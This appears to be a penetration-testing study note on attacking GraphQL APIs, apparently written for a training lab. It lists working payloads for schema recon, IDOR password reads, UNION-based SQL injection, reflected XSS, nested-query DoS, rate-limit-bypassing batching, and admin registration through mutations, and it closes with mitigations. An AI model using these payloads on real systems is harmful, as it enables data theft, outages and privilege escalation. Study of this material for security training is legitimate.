# Attacking GraphQL

## 🎯 Main Idea
- GraphQL is a query language for web APIs (alternative to REST), typically exposed on a single endpoint (`/graphql`, `/api/graphql`) handling all queries, mutations, and subscriptions.
- Queries select `fields` of typed objects and support arguments and sub-querying; mutations modify server data.
- Attack flow: identify the engine, abuse introspection for recon, then exploit IDOR, injection, DoS/batching, and privileged mutations.

## 💥 Attack / Exploit Vectors

### Engine Identification & Information Disclosure
- Confirm GraphQL use by observing requests to `/graphql`; fingerprint the engine (e.g. Graphene) via graphw00f, cross-reference GraphQL-Threat-Matrix.
- A `graphiql` IDE exposed at `/graphql` lets you run queries directly without wrestling with JSON syntax.
- **Commands**
  - `python3 main.py -d -f -t http://172.17.0.2` — graphw00f: detect (`-d`) and fingerprint (`-f`) the GraphQL engine/endpoint

### Introspection (Schema Recon)
- Introspection queries the `__schema`/`__type` fields to dump all supported types, fields, queries, and mutations — the primary recon technique.
- Visualize the full schema with GraphQL-Voyager (paste introspection result → CHANGE SCHEMA → INTROSPECTION).
- **Commands**
  - `{ __schema { types { name } } }` — list all GraphQL types (default + custom, e.g. `UserObject`)
  - `{ __type(name: "UserObject") { name fields { name type { name kind } } } }` — list a type's fields (reveals e.g. `password`)
  - `{ __schema { queryType { fields { name description } } } }` — list all supported queries
  - `query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } }` — full general introspection dump (with FullType/InputValue/TypeRef fragments)

### Insecure Direct Object Reference (IDOR)
- Queries that take an identifier argument often lack authorization checks — supply another known username/ID to read other users' data.
- Combine with introspection to discover sensitive fields (e.g. `password`) then request them.
- **Commands**
  - `{ user(username: "test") { username password } }` — retrieve another user's data/password via missing authz check

### Injection Attacks (SQLi & XSS)
- Investigate every query argument for injection. Identify required args by sending the query with none and reading the error.
- SQLi: inject into string args; a single quote triggers a SQL error (often reflecting the query), enabling UNION-based exfiltration of data not exposed via the API.
- XSS: payloads reflected unencoded in error messages (e.g. type-mismatch errors) are a potential injection point.
- **Commands**
  - `{ postByAuthor { id title } }` — send without args to leak required argument name in error
  - `{ user(username: "htb-stdnt' ") { uuid } }` — single quote to provoke SQL error and confirm SQLi
  - `{ user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") { username } }` — UNION-based SQLi (column count matches object fields) to dump table names
  - `{ post(id: "<script>alert(1)</script>") { title } }` — XSS payload reflected in error message

### Denial-of-Service (DoS) via Nested Loops
- Schema loops (e.g. `UserObject.posts` ↔ `PostObject.author`) let you build deeply nested queries whose responses grow exponentially, exhausting backend resources.
- Connection fields require `edges { node { ... } }` to traverse.
- **Commands**
  - `{ posts { author { posts { edges { node { author { username } } } } } }` — nested loop query; repeat nesting to amplify toward DoS

### Batching Attacks
- Batching = multiple queries in one HTTP request (JSON list). Not a vuln itself, but defeats rate limits for brute-force (e.g. login) — thousands of attempts per request.
- **Commands**
  - `[ {"query":"{user(username: \"admin\") {uuid}}"}, {"query":"{post(id: 1) {title}}"} ]` — array batch of multiple queries in a single POST

### Mutations (Data Modification & Privilege Escalation)
- Enumerate mutations and their input objects via introspection, then abuse them to create/update/delete data.
- Mass-assignment-style abuse: if a mutation input accepts a `role` field, register an `admin` user to escalate privileges and reach `/admin`.
- **Commands**
  - `query { __schema { mutationType { name fields { name args { name defaultValue type { ...TypeRef } } } } } }` — enumerate all mutations and their arguments
  - `{ __type(name: "RegisterUserInput") { name inputFields { name description defaultValue } } }` — list input-object fields
  - `echo -n 'password' | md5sum` — hash a password to the format the mutation expects
  - `mutation { registerUser(input: {username: "vautiaAdmin", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "admin", msg: "Hacked!"}) { user { username role } } }` — register an admin user (privilege escalation via mutation)

## 🛠️ Key Tools & Concepts
- graphw00f — fingerprints the GraphQL engine and locates the endpoint
- GraphQL-Voyager — visualizes a schema from introspection output
- GraphQL-Cop — security audit tool; flags introspection, batching, alias/field/directive overloading, GET-query/CSRF, field suggestions
- InQL — Burp extension; adds GraphQL tabs, generates queries/introspection, eases editing inside JSON
- GraphiQL — in-browser IDE, convenient query execution if left exposed
- GraphQL-Threat-Matrix — per-engine security capability reference
- Introspection / `__schema` / `__type` — core recon mechanism
- Connections / `edges`/`node` — pagination wrappers needed to traverse related objects

## 🛡️ Mitigations
- Information disclosure: generic error messages, disable introspection (or strip sensitive data from it).
- Injection: strict input validation/sanitization, treat all input as untrusted, prefer allowlists over denylists.
- DoS/batching: limit query depth and size, rate-limit the endpoint, disable batching where possible.
- API design: least-privilege access control, require authentication on the endpoint, enforce authorization on queries and mutations (see OWASP GraphQL Cheat Sheet).
